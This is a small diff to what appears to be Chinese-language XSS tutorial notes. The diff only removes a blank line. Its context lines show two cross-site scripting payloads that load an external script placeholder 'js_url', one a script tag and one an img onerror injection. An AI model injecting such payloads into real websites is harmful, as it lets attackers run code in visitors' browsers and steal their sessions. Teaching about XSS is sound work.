@@ -171,7 +171,6 @@ xss几乎每个网站都存在，google、baidu、360等都存在。
 <script scr="js_url"></script>
 ```
 也可以这样
-
 ```
 <img src=x onerror=appendChild(createElement('script')).src='js_url' />
 ```
